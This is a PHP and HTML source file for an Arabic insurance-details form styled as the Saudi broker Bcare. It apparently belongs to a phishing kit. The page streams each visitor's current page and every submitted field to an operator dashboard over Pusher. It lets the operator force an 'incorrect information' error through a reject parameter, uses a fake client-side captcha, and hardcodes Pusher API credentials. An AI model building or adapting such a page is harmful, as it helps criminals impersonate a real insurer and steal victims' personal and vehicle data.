<?php
error_reporting(0);
ini_set('display_errors', 0);
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'بيانات التأمين');
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'بيانات التأمين']);
}

if (isset($_GET['reject'])) {
    $showError = true;
}

if (isset($_POST['submit'])) {
    if (isset($_SESSION['user_id'])) {
        $dbRef = new DB();
        $dbRef->query("UPDATE `users` SET `docDate` = ?, `purposeUse` = ?, `carValue` = ?, `createdYear` = ?, `repairPlace` = ?, `message` = ? WHERE `id` = ?");
        $dbRef->bind(1, $_POST['date']);
        $dbRef->bind(2, $_POST['purposeUse']);
        $dbRef->bind(3, $_POST['carValue']);
        $dbRef->bind(4, $_POST['createdYear']);
        $dbRef->bind(5, $_POST['repairPlace']);
        $dbRef->bind(6, 'بيانات التأمين');
        $dbRef->bind(7, $_SESSION['user_id']);
        if ($dbRef->execute()) {
            $pusher->trigger('bcare', 'update-user-accountt', [
                'userId' => $_SESSION['user_id'],
                'updatedData' => [
                    'message' => 'بيانات التأمين',
                    'date' => $_POST['date'],
                    'purposeUse' => $_POST['purposeUse'],
                    'carValue' => $_POST['carValue'],
                    'createdYear' => $_POST['createdYear'],
                    'repairPlace' => $_POST['repairPlace']
                ]
            ]);
        }
    }
    $_SESSION['date'] = $_POST['date'];
    $_SESSION['createdYear'] = $_POST['createdYear'];
    echo "<script>document.location.href='index-types.php';</script>";
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بيانات التأمين | بي كير</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --color-primary: #0F4C72;
            --color-primary-dark: #0a3654;
            --color-primary-light: #E8F4F8;
            --color-accent: #F2A340;
            --color-background: #F4F7FB;
            --color-text-primary: #1E293B;
            --color-text-secondary: #64748B;
            --color-border: #E2E8F0;
            --shadow-soft: 0 16px 40px rgba(15, 76, 114, 0.12);
            --shadow-card: 0 14px 30px rgba(15, 76, 114, 0.16);
        }

        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Cairo", sans-serif;
            direction: rtl;
        }

        body {
            background: linear-gradient(135deg, var(--color-background) 0%, #ffffff 100%);
            color: var(--color-text-primary);
            min-height: 100vh;
        }

        /* Navbar */
        .navbar {
            background: white;
            padding: 1rem 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }

        /* Hero Section */
        .hero-section {
            background: linear-gradient(135deg, var(--color-primary) 0%, var(--color-primary-dark) 100%);
            padding: 3rem 0 4rem;
            position: relative;
            overflow: hidden;
        }

        .hero-section::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -10%;
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(242, 163, 64, 0.15) 0%, transparent 70%);
            border-radius: 50%;
            animation: float-soft 8s ease-in-out infinite;
        }

        .hero-section::after {
            content: '';
            position: absolute;
            bottom: -30%;
            left: -5%;
            width: 400px;
            height: 400px;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
            border-radius: 50%;
            animation: float-soft 10s ease-in-out infinite reverse;
        }

        @keyframes float-soft {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(-20px, -20px); }
        }

        .hero-content {
            position: relative;
            z-index: 2;
        }

        .hero-title {
            font-size: 1.75rem;
            font-weight: 900;
            color: white;
            margin-bottom: 0.5rem;
            text-align: center;
        }

        .hero-subtitle {
            font-size: 0.938rem;
            color: rgba(255, 255, 255, 0.9);
            text-align: center;
        }

        /* Form Card */
        .form-card {
            background: white;
            border-radius: 1.5rem;
            padding: 2rem;
            box-shadow: var(--shadow-card);
            border: 1px solid var(--color-border);
            margin-top: -2rem;
            position: relative;
            z-index: 10;
        }

        .form-section-title {
            font-size: 1.25rem;
            font-weight: 700;
            color: var(--color-primary);
            margin-bottom: 1.5rem;
            padding-bottom: 0.75rem;
            border-bottom: 2px solid var(--color-border);
        }

        .form-field {
            margin-bottom: 1.25rem;
        }

        .form-field label {
            display: block;
            font-size: 0.875rem;
            font-weight: 600;
            color: var(--color-text-primary);
            margin-bottom: 0.5rem;
        }

        .form-field input,
        .form-field select {
            width: 100%;
            padding: 0.875rem 1rem;
            background: white;
            border: 1px solid var(--color-border);
            border-radius: 0.75rem;
            font-size: 0.938rem;
            color: var(--color-text-primary);
            transition: all 0.3s;
        }

        .form-field input:focus,
        .form-field select:focus {
            outline: none;
            border-color: var(--color-primary);
            box-shadow: 0 0 0 3px var(--color-primary-light);
        }

        .form-field input::placeholder {
            color: #9CA3AF;
        }

        .form-field input[readonly] {
            background: var(--color-background);
            cursor: pointer;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr;
            gap: 1rem;
        }

        /* Repair Options */
        .repair-options {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 0.75rem;
        }

        .repair-option {
            padding: 1rem;
            background: white;
            border: 2px solid var(--color-border);
            border-radius: 0.75rem;
            text-align: center;
            font-weight: 600;
            color: var(--color-text-primary);
            cursor: pointer;
            transition: all 0.3s;
        }

        .repair-option:hover {
            border-color: var(--color-primary);
            background: var(--color-primary-light);
        }

        .repair-option.active {
            background: var(--color-primary);
            color: white;
            border-color: var(--color-primary);
        }

        .repair-option input {
            display: none;
        }

        /* Captcha */
        .captcha-group {
            display: flex;
            gap: 0.75rem;
            align-items: center;
        }

        .captcha-input {
            flex: 1;
        }

        #captchaCanvas {
            background: var(--color-background);
            border: 1px solid var(--color-border);
            border-radius: 0.75rem;
            cursor: pointer;
            transition: all 0.3s;
        }

        #captchaCanvas:hover {
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        /* Submit Button */
        .btn-submit {
            width: 100%;
            padding: 1rem;
            background: var(--color-accent);
            color: white;
            border: none;
            border-radius: 0.75rem;
            font-size: 1.125rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 1.5rem;
        }

        .btn-submit:hover:not(:disabled) {
            background: #e8951a;
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(242, 163, 64, 0.3);
        }

        .btn-submit:disabled {
            background: var(--color-border);
            color: var(--color-text-secondary);
            cursor: not-allowed;
            transform: none;
        }

        /* Features */
        .features-section {
            margin-top: 4rem;
            padding: 2rem 0;
        }

        .features-title {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--color-primary);
            text-align: center;
            margin-bottom: 2rem;
        }

        .features-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 1rem;
        }

        .feature-box {
            background: white;
            border-radius: 1rem;
            padding: 1.5rem;
            text-align: center;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
            transition: all 0.3s;
        }

        .feature-box:hover {
            transform: translateY(-4px);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
        }

        .feature-box img {
            width: 2.5rem;
            height: 2.5rem;
            margin-bottom: 0.75rem;
        }

        .feature-box h6 {
            font-size: 0.875rem;
            font-weight: 600;
            color: var(--color-primary);
            margin: 0;
        }

        /* Footer */
        footer {
            background: var(--color-primary);
            color: white;
            padding: 2.5rem 0;
            margin-top: 5rem;
            text-align: center;
        }

        footer img {
            height: 40px;
            margin-bottom: 1.5rem;
        }

        footer p {
            font-size: 0.813rem;
            opacity: 0.8;
            margin: 0;
        }

        /* Calendar Modal */
        .modal-content {
            border-radius: 1.5rem;
            border: none;
            overflow: hidden;
        }

        .calendar-header {
            background: var(--color-primary);
            color: white;
            padding: 1.5rem;
        }

        .calendar-header h5 {
            margin: 0;
            font-weight: 700;
        }

        .calendar-header .btn {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            width: 2.5rem;
            height: 2.5rem;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
        }

        .calendar-header .btn:hover {
            background: rgba(255, 255, 255, 0.3);
        }

        .calendar-table {
            margin: 0;
        }

        .calendar-table th {
            color: var(--color-text-secondary);
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            padding: 0.75rem 0.5rem;
        }

        .calendar-table td {
            padding: 0.75rem;
            font-weight: 600;
            cursor: pointer;
            border-radius: 0.5rem;
            transition: all 0.3s;
        }

        .calendar-table td:hover:not(.disabled) {
            background: var(--color-primary-light);
            color: var(--color-primary);
        }

        .calendar-table td.today {
            background: var(--color-accent);
            color: white;
        }

        .calendar-table td.disabled {
            color: var(--color-border);
            cursor: not-allowed;
        }

        /* Responsive */
        @media (min-width: 640px) {
            .hero-title {
                font-size: 2rem;
            }

            .form-card {
                padding: 2.5rem;
            }

            .form-row {
                grid-template-columns: 6fr 4fr;
            }

            .features-grid {
                grid-template-columns: repeat(4, 1fr);
                gap: 1.5rem;
            }
        }

        @media (min-width: 1024px) {
            .hero-title {
                font-size: 2.25rem;
            }
        }
    </style>
</head>

<body>

    <!-- Navbar -->
    <nav class="navbar">
        <div class="container text-center">
            <a href="index.php">
                <img src="./assets/Bcare-logo.svg" alt="Bcare" height="40">
            </a>
        </div>
    </nav>

    <!-- Hero Section -->
    <div class="hero-section">
        <div class="container">
            <div class="hero-content">
                <h1 class="hero-title">استكمل بيانات التأمين</h1>
                <p class="hero-subtitle">أدخل التفاصيل المطلوبة للحصول على أفضل العروض</p>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <main class="container pb-5">
        <div class="row justify-content-center">
            <div class="col-lg-8">

                <!-- Form Card -->
                <div class="form-card">
                    <h3 class="form-section-title">بيانات التأمين</h3>
                    
                    <form action="" method="POST" id="detailsForm">

                        <div class="form-field">
                            <label>تاريخ بدء الوثيقة</label>
                            <input type="text" id="selectedDate" name="date" readonly required
                                placeholder="اختر التاريخ من التقويم">
                        </div>

                        <div class="form-field">
                            <label>الغرض من استخدام المركبة</label>
                            <select name="purposeUse" required>
                                <option value="">إختر الغرض</option>
                                <option value="شخصي">شخصي</option>
                                <option value="تجاري">تجاري</option>
                                <option value="تأجير">تأجير</option>
                                <option value="نقل الركاب أو كريم-أوبر">نقل الركاب أو كريم-أوبر</option>
                                <option value="نقل بضائع">نقل بضائع</option>
                            </select>
                        </div>

                        <div class="form-row">
                            <div class="form-field">
                                <label>القيمة التقديرية للمركبة (ريال)</label>
                                <input type="number" name="carValue" required placeholder="مثال: 50,000">
                            </div>
                            <div class="form-field">
                                <label>سنة الصنع</label>
                                <select name="createdYear" required>
                                    <option value="">سنة الصنع</option>
                                    <?php for ($i = 2026; $i >= 1990; $i--) echo "<option value='$i'>$i</option>"; ?>
                                </select>
                            </div>
                        </div>

                        <div class="form-field">
                            <label>مكان الإصلاح المفضل</label>
                            <div class="repair-options">
                                <label class="repair-option active" id="labelRepairAgency">
                                    <input type="radio" name="repairPlace" value="الوكالة" checked onchange="updateRepairUI()">
                                    <span>الوكالة</span>
                                </label>
                                <label class="repair-option" id="labelRepairWorkshop">
                                    <input type="radio" name="repairPlace" value="الورشة" onchange="updateRepairUI()">
                                    <span>الورشة</span>
                                </label>
                            </div>
                        </div>

                        <div class="form-field">
                            <label>رمز التحقق</label>
                            <div class="captcha-group">
                                <input type="text" id="captchaInput" required class="captcha-input" placeholder="أدخل الرمز">
                                <canvas id="captchaCanvas" width="100" height="55" onclick="generateCaptcha()"></canvas>
                            </div>
                        </div>

                        <button type="submit" name="submit" id="submitBtn" disabled class="btn-submit">
                            إظهار العروض
                        </button>
                    </form>
                </div>

            </div>
        </div>

        <!-- Features Section -->
        <div class="features-section">
            <h4 class="features-title">لماذا بي كير هي الخيار الأفضل؟</h4>
            <div class="features-grid">
                <div class="feature-box">
                    <img src="./assets/insureOneMin.svg" alt="">
                    <h6>تأمينك في دقيقة</h6>
                </div>
                <div class="feature-box">
                    <img src="./assets/priceLess.svg" alt="">
                    <h6>أفضل الأسعار</h6>
                </div>
                <div class="feature-box">
                    <img src="./assets/sechleInsure.svg" alt="">
                    <h6>إصدار فوري</h6>
                </div>
                <div class="feature-box">
                    <img src="./assets/saudi.svg" alt="">
                    <h6>سعودي 100%</h6>
                </div>
            </div>
        </div>
    </main>

    <!-- Calendar Modal -->
    <div class="modal fade" id="calendarModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="calendar-header d-flex justify-content-between align-items-center">
                    <button class="btn text-white" onclick="prevMonth()">
                        <i class="bi bi-chevron-right"></i>
                    </button>
                    <h5 id="calendarTitle"></h5>
                    <button class="btn text-white" onclick="nextMonth()">
                        <i class="bi bi-chevron-left"></i>
                    </button>
                </div>
                <div class="p-3">
                    <table class="table calendar-table text-center">
                        <thead>
                            <tr>
                                <th>ح</th>
                                <th>ن</th>
                                <th>ث</th>
                                <th>ر</th>
                                <th>خ</th>
                                <th>ج</th>
                                <th>س</th>
                            </tr>
                        </thead>
                        <tbody id="calendarBody"></tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4" style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">المعلومات غير صحيحة</h5>
                    <p class="text-muted small px-3">البيانات التي أدخلتها غير صحيحة، يرجى التأكد من الحقول والمحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal" style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <div class="container">
            <img src="./assets/logo-bacre-white.svg" alt="Bcare">
            <p>جميع الحقوق محفوظة © 2025 شركة عناية الوسيط لوساطة التأمين</p>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        let captchaText = '';
        
        function generateCaptcha() {
            const canvas = document.getElementById('captchaCanvas');
            const ctx = canvas.getContext('2d');
            captchaText = Math.floor(1000 + Math.random() * 9000).toString();
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.font = 'bold 24px Cairo';
            ctx.fillStyle = '#0F4C72';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            ctx.fillText(captchaText, canvas.width / 2, canvas.height / 2);
            document.getElementById('captchaInput').setAttribute('pattern', captchaText);
        }

        function updateRepairUI() {
            const workshop = document.querySelector('input[value="الورشة"]').checked;
            document.getElementById('labelRepairWorkshop').classList.toggle('active', workshop);
            document.getElementById('labelRepairAgency').classList.toggle('active', !workshop);
        }

        // Calendar Logic
        let currentCalDate = new Date();
        const calModal = new bootstrap.Modal(document.getElementById('calendarModal'));

        document.getElementById('selectedDate').onclick = () => {
            renderCalendar();
            calModal.show();
        };

        function renderCalendar() {
            const body = document.getElementById('calendarBody');
            const title = document.getElementById('calendarTitle');
            body.innerHTML = '';

            const year = currentCalDate.getFullYear();
            const month = currentCalDate.getMonth();
            const monthNames = ["يناير", "فبراير", "مارس", "أبريل", "مايو", "يونيو", "يوليو", "أغسطس", "سبتمبر", "أكتوبر", "نوفمبر", "ديسمبر"];
            title.innerText = `${monthNames[month]} ${year}`;

            const firstDay = new Date(year, month, 1).getDay();
            const daysInMonth = new Date(year, month + 1, 0).getDate();
            const today = new Date();

            let row = document.createElement('tr');
            for (let i = 0; i < firstDay; i++) row.appendChild(document.createElement('td'));

            for (let d = 1; d <= daysInMonth; d++) {
                if (row.children.length === 7) { 
                    body.appendChild(row); 
                    row = document.createElement('tr'); 
                }
                const cell = document.createElement('td');
                cell.innerText = d;

                const cellDate = new Date(year, month, d);
                if (cellDate < today.setHours(0, 0, 0, 0)) {
                    cell.classList.add('disabled');
                } else {
                    cell.onclick = () => {
                        document.getElementById('selectedDate').value = `${year}-${String(month + 1).padStart(2, '0')}-${String(d).padStart(2, '0')}`;
                        calModal.hide();
                        validateForm();
                    };
                }
                if (cellDate.toDateString() === new Date().toDateString()) {
                    cell.classList.add('today');
                }
                row.appendChild(cell);
            }
            body.appendChild(row);
        }

        function prevMonth() { 
            currentCalDate.setMonth(currentCalDate.getMonth() - 1); 
            renderCalendar(); 
        }
        
        function nextMonth() { 
            currentCalDate.setMonth(currentCalDate.getMonth() + 1); 
            renderCalendar(); 
        }

        function validateForm() {
            const form = document.getElementById('detailsForm');
            const isValid = form.checkValidity() && document.getElementById('captchaInput').value === captchaText;
            document.getElementById('submitBtn').disabled = !isValid;
        }

        $(document).ready(() => {
            generateCaptcha();
            $('#detailsForm input, #detailsForm select').on('input change', validateForm);
            
            <?php if (isset($showError) && $showError): ?>
            var myModal = new bootstrap.Modal(document.getElementById('errorModal'));
            myModal.show();
            <?php endif; ?>
        });
    </script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        var userIdFromSession = <?= json_encode($_SESSION['user_id'] ?? null); ?>;
    </script>
    <?php include 'chat_widget.php'; ?>
</body>

</html>